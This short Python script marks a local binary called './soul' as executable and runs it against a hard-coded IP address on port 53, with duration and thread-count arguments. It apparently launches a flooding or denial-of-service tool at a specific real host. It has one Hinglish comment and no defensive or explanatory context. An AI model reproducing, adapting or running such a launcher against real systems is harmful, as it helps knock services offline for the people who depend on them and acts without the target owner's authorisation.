import subprocess
import sys
import os

ip = "200.40.36.1"
port = "53"
time = "120"
threads = "100"

# Execute permission set karo
os.chmod("./soul", 0o755)

subprocess.run(["./soul", ip, port, time, threads])
